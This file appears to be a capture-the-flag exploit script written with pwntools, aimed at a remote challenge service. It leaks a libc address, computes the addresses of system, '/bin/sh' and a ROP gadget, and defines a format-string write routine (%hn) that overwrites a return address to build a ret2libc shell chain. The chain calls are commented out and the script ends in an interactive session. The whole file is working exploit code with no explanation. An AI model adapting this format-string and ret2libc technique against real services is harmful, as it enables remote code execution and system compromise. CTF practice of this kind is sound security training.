from pwn import *
# context.log_level = 'debug'
context.arch = "amd64"

import argparse
import sys
if len(sys.argv) > 1:
    first_arg = int(sys.argv[1])
    
e = context.binary = ELF('chall')
# r= e.process()
r = remote('34.70.212.151', 8003)
lib = e.libc
path_lib= ['libc6_2.35-0ubuntu3.4_amd64.so','libc6_2.35-0ubuntu3.5_amd64.so', 'libc6_2.12.1-0ubuntu10.4_amd64.so']
# ld = ELF('ld-linux-x86-64.so.2')
path = path_lib[first_arg]
lib= ELF(path)

import subprocess
def one_gadget(filename):
  return [int(i) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]
  

r.sendline(b"1")
r.recvuntil(b"0x")
fgets_libc =int(r.recv(12), 16)

base_libc = fgets_libc-lib.sym.fgets
system_libc = base_libc +lib.sym.system
binsh_libc = base_libc + next(lib.search(b"/bin/sh"))
pop_rdi_ret =lib.sym.iconv+197+base_libc
ret = pop_rdi_ret+1
# log.info("retn: %#x" %retn)
log.info("fgets_libc: %#x" %fgets_libc)
log.info("base_libc: %#x" %base_libc)
log.info("system_libc: %#x" %system_libc)
log.info("binsh_libc: %#x" %binsh_libc)
log.info("pop_rdi_ret: %#x" %pop_rdi_ret)


def write_addr(value, retn):
    for i in range(3):
        time.sleep(0.5)
        r.sendlineafter(b"3. Exit\n>> ",b"2")
        payload= (f"%{value&0xffff}c%8$hn".encode()).ljust(16,b"a")+p64(retn)
        time.sleep(0.5)
        r.sendlineafter(b">> ",payload)
        print(payload)
        value = value>>16
        retn+=2



# gdb.attach(r, f"b*vuln+132\n si")
# pause()
# write_addr(ret, retn)
# retn+=8
# write_addr(pop_rdi_ret, retn)
# retn+=8
# write_addr(binsh_libc, retn)
# retn+=8
# write_addr(system_libc, retn)

# r.sendline(b"3")
r.interactive()
